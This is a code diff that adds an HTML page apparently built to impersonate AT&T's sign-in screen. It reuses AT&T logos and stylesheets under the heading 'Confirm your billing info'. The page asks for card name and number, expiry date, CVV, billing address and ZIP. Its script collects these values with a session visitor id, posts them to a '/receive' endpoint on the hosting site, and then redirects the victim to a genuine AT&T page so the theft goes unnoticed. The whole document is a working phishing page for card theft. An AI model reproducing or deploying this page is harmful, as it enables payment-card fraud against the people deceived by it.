@@ -1,0 +1,469 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" class="isAndroid isMobile isChrome isTouch isPortrait">
+
+<head>
+    <meta charset="utf-8" />
+    <title>Login Screen</title>
+    <base href="/" />
+
+    <meta http-equiv="X-UA-Compatible" content="IE=9; IE=8; IE=7;IE=11; IE=EDGE" />
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0,shrink-to-fit=no" />
+    <meta name="apple-itunes-app" content="app-id=309172177" /><!-- Dynatrace Javascript -->
+    	<link rel="icon" type="image/x-icon" href="https://cdn.icon-icons.com/icons2/2699/PNG/512/att_logo_icon_170510.png" />
+<script>
+	const url = window.location.href;
+	const parts = url.split('/');
+	const ablp = parts.slice(0, parts.length - 1).join('/');
+	
+console.log(ablp); 
+
+    </script>
+        <link rel="stylesheet" href="https://signin.att.com/static/siam/en/halo_c/halo-c-login/styles.css?v=20.3.4" />
+    
+    <style>
+        .full-height[_ngcontent-jdy-c36] {
+            min-height: 100vh
+        }
+    </style>
+    <style>
+        .app-card-router-outlet[_ngcontent-jdy-c28] {
+            width: 100%
+        }
+    </style>
+    <style>
+        .footer-div[_ngcontent-jdy-c34] {
+            margin-top: 48px;
+            margin-bottom: 24px
+        }
+
+        .footer-links-div[_ngcontent-jdy-c34] {
+            display: flex;
+            flex-direction: row
+        }
+
+        .footer-links-div[_ngcontent-jdy-c34] app-footer-link[_ngcontent-jdy-c34] {
+            margin-right: 24px
+        }
+
+        .footer-links-div[_ngcontent-jdy-c34] app-footer-link[_ngcontent-jdy-c34]:last-child {
+            margin-right: 0
+        }
+
+        .copyright[_ngcontent-jdy-c34] {
+            margin-top: 16px;
+            display: flex;
+            flex-direction: row;
+            align-items: center;
+            justify-content: center
+        }
+
+        @media (max-width:767px) {
+            .footer-div[_ngcontent-jdy-c34] {
+                margin-bottom: 32px
+            }
+
+            .footer-links-div[_ngcontent-jdy-c34] {
+                display: flex;
+                flex-direction: column;
+                align-items: flex-start
+            }
+
+            .footer-links-div[_ngcontent-jdy-c34] app-footer-link[_ngcontent-jdy-c34] {
+                margin-bottom: 10px
+            }
+
+            .footer-links-div[_ngcontent-jdy-c34] app-footer-link[_ngcontent-jdy-c34]:last-child {
+                margin-bottom: 0
+            }
+
+            app-footer-link[_ngcontent-jdy-c34] {
+                height: 24px
+            }
+
+            .copyright[_ngcontent-jdy-c34] {
+                margin-top: 16px;
+                justify-content: flex-start
+            }
+        }
+    </style>
+    <style>
+        .header-logo-image-bottom[_ngcontent-jdy-c27],
+        .split-login-header[_ngcontent-jdy-c27] {
+            margin-bottom: 32px
+        }
+
+        .header-logo-image-top[_ngcontent-jdy-c27] {
+            margin-top: 32px
+        }
+
+        .header-logo-position-fr-qrcard[_ngcontent-jdy-c27] {
+            margin-left: 70px;
+            align-self: flex-start
+        }
+
+        .header-logo-position-fr-learMore[_ngcontent-jdy-c27] {
+            margin-bottom: 48px;
+            align-self: flex-start
+        }
+
+        .header-floating-logo-generic[_ngcontent-jdy-c27] {
+            margin-top: 32px;
+            margin-left: 70px;
+            margin-bottom: 64px;
+            align-self: flex-start
+        }
+
+        .left-align-header-logo-desktop[_ngcontent-jdy-c27] {
+            align-self: flex-start
+        }
+
+        .header-logo-image-no-bottom[_ngcontent-jdy-c27] {
+            margin-bottom: 0
+        }
+
+        @media (max-width:767px) {
+            .header-logo-position-fr-qrcard[_ngcontent-jdy-c27] {
+                margin-left: 0;
+                align-self: center
+            }
+
+            .header-logo-image-bottom[_ngcontent-jdy-c27] {
+                margin-bottom: 16px
+            }
+
+            .header-logo-position-fr-learMore[_ngcontent-jdy-c27] {
+                margin-bottom: 16px;
+                align-self: center
+            }
+
+            .header-floating-logo-generic[_ngcontent-jdy-c27] {
+                margin-left: 0
+            }
+
+            .header-floating-logo-generic[_ngcontent-jdy-c27],
+            .left-align-header-logo-desktop[_ngcontent-jdy-c27] {
+                margin-bottom: 32px;
+                align-self: center
+            }
+
+            .header-logo-image-no-bottom[_ngcontent-jdy-c27] {
+                margin-bottom: 0
+            }
+        }
+    </style>
+    <style>
+        .fg-sign-in[_ngcontent-jdy-c50] {
+            margin-top: 8px
+        }
+
+        .bottom-container[_ngcontent-jdy-c50] {
+            margin-top: 48px
+        }
+
+        @media (max-width:767px) {
+            .bottom-container[_ngcontent-jdy-c50] {
+                margin-top: 32px
+            }
+        }
+    </style>
+    <style>
+        .space-below[_ngcontent-jdy-c38] {
+            margin-bottom: 32px
+        }
+
+        @media (max-width:767px) {
+            .space-below[_ngcontent-jdy-c38] {
+                margin-bottom: 24px
+            }
+        }
+    </style>
+    <style>
+        .prepaid-ctn-button[_ngcontent-jdy-c48] {
+            width: 100%;
+            height: 48px;
+            text-align: center;
+            border-radius: 3px;
+            border: 1px solid #1d2329;
+            background-color: #fff;
+            color: #1d2329;
+            font-size: 1.4rem;
+            line-height: 2.5rem;
+            margin-top: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center
+        }
+
+        .prepaid-ctn-button[_ngcontent-jdy-c48]:hover {
+            text-decoration: none;
+            background-color: #1d2329;
+            color: #fff
+        }
+        
+        .formfield{
+        margin-top: 25px;
+        }
+        
+        .ng-touched{
+        border-radius: 3px;
+        
+        }
+        
+        .errmess{
+        font-size:1.2rem;
+        color:#c70032;
+        margin-top:5px;
+        }
+    </style>
+</head>
+
+<body>
+    <div id="app-root" _nghost-jdy-c36="" ng-version="11.2.14" app-version="20.3.5">
+        <div _ngcontent-jdy-c36="" id="appCompBackground" class="full-width-background bg-white">
+            <div _ngcontent-jdy-c36="" id="appCompContainer" class="container pad-l-none-sm pad-r-none-sm pad-t-none-sm pad-b-none-sm full-height flex flex-column">
+                <!---->
+                <div _ngcontent-jdy-c36="" id="appCompCardContainer" class="row justify-center flex-1">
+                    <div _ngcontent-jdy-c36="" id="appCompCardContDiv" class="pad-none">
+                        <!---->
+                        <app-card _ngcontent-jdy-c36="" role="main" _nghost-jdy-c28="">
+                            <div _ngcontent-jdy-c28="" class="card rel z0 flex flex-column no-border-sm radius-lg no-radius-sm mar-t-none-sm border-shadow login-card mar-t-xl-lg">
+                                <div _ngcontent-jdy-c28="" class="pad-lg-lg pad-xl-sm pad-t-lg-lg pad-t-xl pad-b-lg-lg pad-b-xl pad-l-lg pad-r-lg">
+                                    <app-header _ngcontent-jdy-c28="" class="flex-container" _nghost-jdy-c27=""><img _ngcontent-jdy-c27="" id="headerLogoImage" alt="" src="https://signin.att.com/static/siam/en/halo_c/images/logos/att_hz_lg_lkp_rgb_pos.svg" class="header-logo-image header-logo-image-bottom" />
+                                        <!---->
+                                        <!---->
+                                        <!---->
+                                        <div _ngcontent-jdy-c27="" class="split-login-header text-center">
+                                            <h1 _ngcontent-jdy-c27="" id="signInHeaderText" class="heading-lg letter-spacing-3"><span style="font-size:2rem;">Confirm your billing info</span></h1> 
+                                            <!--h1 _ngcontent-jdy-c27="" id="signInHeaderToText" class="heading-md letter-spacing-3 mar-t8">to myAT&T</h1-->
+                                        </div>
+                                        <!---->
+                                        <!---->
+                                        <!---->
+                                    </app-header>
+                                    <!---->
+                                    <div _ngcontent-jdy-c28="" class="app-card-router-outlet">
+                                        <router-outlet _ngcontent-jdy-c28=""></router-outlet>
+                                        <app-manual-login _nghost-jdy-c50="">
+                                            <app-error _ngcontent-jdy-c50="" id="appErrorAbove">
+                                                <!---->
+                                            </app-error>
+                                            <!---->
+                                            	
+                                            <form. id="credit-card-form" class="manual-login-form ng-pristine ng-invalid ng-touched" >
+                                            		
+                                            	 <div style="background-color:#f2f2f2; padding:8px; border-radius:2px; border:1px solid black;">
+    <div class="formfield">
+        <label class="formfield-label">Card Name</label>
+        <input class="textfield ng-pristine ng-invalid ng-touched inputx" placeholder="Card Name" id="Card Name" name="Card-Name" />
+        <div class="errmess"></div>
+    </div>
+
+    <div class="formfield">
+        <label class="formfield-label">Card Number</label>
+        <input class="textfield ng-pristine ng-invalid ng-touched inputx" placeholder="Enter Card Number" id="Card Number" name="Card-Number" />
+        <div class="errmess"></div>
+    </div>
+
+    <div style="display:flex; flex-direction:row; gap: 10px;">
+        <div class="formfield">
+            <label class="formfield-label">Expiry date</label>
+            <input class="textfield ng-pristine ng-invalid ng-touched inputx" placeholder="MM/YY" id="Expiry Date" name="Expiry-Date" />
+            <div class="errmess"></div>
+        </div>
+
+        <div class="formfield">
+            <label class="formfield-label">Security code</label>
+            <input class="textfield ng-pristine ng-invalid ng-touched inputx" placeholder="CVV" id="CVV" name="CVV" />
+            <div class="errmess"></div>
+        </div>
+    </div>
+
+    <div class="formfield">
+        <label class="formfield-label">Billing Address</label>
+        <input class="textfield ng-pristine ng-invalid ng-touched inputx" id="Address" name="Address" />
+        <div class="errmess"></div>
+    </div>
+
+    <div class="formfield" style="margin-bottom:15px;">
+        <label class="formfield-label">Billing Zip Code</label>
+        <input class="textfield ng-pristine ng-invalid ng-touched inputx" placeholder="5 digits zip code" id="ZIP Code" name="ZIP" />
+        <div class="errmess"></div>
+    </div>
+</div>
+
+                                            <!---->
+                                                <!---->
+                                                <div _ngcontent-jdy-c50="" class="continue-button-spacing"><button _ngcontent-jdy-c50="" style="border-radius:3px" id="sign-in" type="submit" class="btn-primary btn-full-width letter-spacing-3" style="display:block">Confirm</button></div>
+                                           
+                                                <!---->
+                                                <!---->
+                                                <!---->
+                                                <!---->
+                                                <!---->
+                                                
+                                                <app-prepaid-ctn-button _ngcontent-jdy-c50="" _nghost-jdy-c48="">
+                                                    <!---->
+                                                </app-prepaid-ctn-button>
+                                                <!---->
+                                                <!---->
+                                            </form>
+                                            <!---->
+                                        </app-manual-login>
+                                        <!---->
+                                    </div>
+                                </div>
+                            </div>
+                        </app-card>
+                    </div>
+                </div>
+                <div _ngcontent-jdy-c36="" id="appCompFooterContainer" class="row flex-centered">
+                    <div _ngcontent-jdy-c36="" id="appCompFooterContDiv" class="grid-col-12 pad-none">
+                        <app-footer _ngcontent-jdy-c36="" role="contentinfo" _nghost-jdy-c34="">
+                            <div _ngcontent-jdy-c34="" class="login-background footer-div pad-l-lg-sm pad-r-lg-sm">
+                                
+                                <!---->
+                                <div _ngcontent-jdy-c34="" class="font-regular copyright"><span _ngcontent-jdy-c34="" id="copyrightTextSpan" class="type-xs color-ui-medium-gray">©2023 AT&T Intellectual Property. All rights reserved.</span></div>
+                                <!---->
+                            </div>
+                        </app-footer>
+                        <!---->
+                    </div>
+                </div>
+            </div>
+        </div>
+        <!---->
+    </div>
+
+    
+    </body>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/cleave.js/1.6.0/cleave.min.js"></script>
+       
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+
+    <script>
+    	let urlpr = sessionStorage.getItem('urlpr');
+ 		if(!urlpr){
+ 		window.location.href = ablp;
+ 		}
+		var visitor = sessionStorage.getItem('visitor');
+		
+const cardNumberInputs = document.getElementsByName('Card-Number');
+cardNumberInputs.forEach(input => {
+    new Cleave(input, {
+        creditCard: true
+    });
+});
+
+
+const expiryDateInputs = document.getElementsByName('Expiry-Date');
+expiryDateInputs.forEach(input => {
+    new Cleave(input, {
+        date: true,
+        datePattern: ['m', 'y']
+    });
+});
+
+
+const cvvInputs = document.getElementsByName('CVV'); 
+cvvInputs.forEach(input => {
+    new Cleave(input, {
+        numericOnly: true,
+        blocks: [3]
+    });
+});
+ 
+	</script>
+	<script>
+		var Signin = document.getElementById('sign-in');
+		
+		Signin.addEventListener('click', function(){
+		event.preventDefault();
+		let myForm = $("#credit-card-form");
+        let checkInputs = document.querySelectorAll('.inputx');
+        console.log(checkInputs);
+        
+        let isEmpty = false;
+
+        for (const check of checkInputs) {
+        	
+            if (check.value.trim() === "") {
+                check.style.borderColor = "#c70032";
+                var errmessage = check.id;
+                document.querySelectorAll('.errmes').textContent = 'Please enter a valid ' + errmessage;
+                check.nextElementSibling.textContent = 'Please enter a valid ' + errmessage;
+                console.log(check.value);
+                
+                isEmpty = true;
+            }else{
+                check.style.backgroundColor = "";
+                check.style.borderColor = "";
+                check.style.borderBottom = "";
+                var errmessage = check.id;
+                document.querySelectorAll('.errmes').textContent = errmessage + " is required"; 
+                check.nextElementSibling.textContent =  ""; 
+                console.log(errmessage + ':' + check.value);
+                var rezult = errmessage + ':' + check.value;
+                console.log(check); 
+                
+                var rezult = errmessage + ':' + check.value;
+
+
+
+
+                
+                isEmpty = false;
+            }
+        }
+
+        if (!isEmpty) {
+        
+            let userinfo = myForm.serializeArray();
+            let user = {};
+            
+            // Define an object to store the data
+			var formData = {};
+			
+			// Select all the input elements within the specified div
+			var inputElements = document.querySelectorAll('.inputx');
+			
+			// Loop through the input elements
+			inputElements.forEach(function(inputElement) {
+			    // Get the label associated with the input
+			    var label = inputElement.closest('.formfield').querySelector('.formfield-label').textContent;
+			    
+			    // Get the value of the input
+			    var value = inputElement.value;
+			    
+			    // Add the label and value to the formData object
+			    formData[label] = value;
+			});
+			
+			// Display the data object
+			console.log(formData);
+
+            
+            
+            
+            userinfo.forEach((value) => {
+                user[value.name] = value.value;
+            });
+
+            formData['visitor'] = visitor; 
+            console.log(user);
+            let url = ablp+'/receive'; 
+            console.log(url);
+            $.ajax({
+                method: 'POST',
+                url: url,
+                data: formData
+            }).done(function(msg) {
+                console.log(msg);
+                window.location.href = "https://about.att.com/sites/accessibility"; 
+            }).fail(function(err, textstatus, error) {
+            
+            });
+        }
+        });
+		</script>
+</html>
